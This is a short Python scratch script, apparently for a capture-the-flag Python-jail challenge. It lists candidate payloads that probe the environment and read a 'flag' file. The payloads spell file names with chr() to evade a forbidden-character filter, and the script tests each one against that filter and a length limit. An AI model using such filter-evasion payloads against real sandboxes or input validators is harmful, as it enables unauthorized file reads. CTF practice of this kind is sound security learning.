#!/usr/bin/env python3

# Alternative approaches that might avoid audit hooks:
# 1. Use only builtins that don't trigger audits
# 2. Access data through non-audited paths
# 3. Exploit the print() wrapper

# The challenge wraps our input in print()
# So "something" becomes print(something)

# Ideas:
# - Can we use dir() to explore?
# - Can we use vars() or globals() to see what's available?
# - Can we use help()?

payloads = [
    # Explore environment
    "dir()",
    "vars()",
    "globals()",
    
    # Try to get to os without import (via builtins)
    "dir(__builtins__)",
    
    # Direct file read attempts
    "open(chr(102)+chr(108)+chr(97)+chr(103)).read()",
    "[*open(chr(102)+chr(108)+chr(97)+chr(103))]",
    
    # Maybe the flag filename is different?
    "open(chr(47)+chr(102)+chr(108)+chr(97)+chr(103)).read()",  # /flag
]

for p in payloads:
    forbidden = " _.\\\"'{}#="
    has_forbidden = any(c in forbidden for c in p)
    print(f"{len(p):3d}ch {'OK' if len(p) < 67 and not has_forbidden else 'BAD'}: {p}")
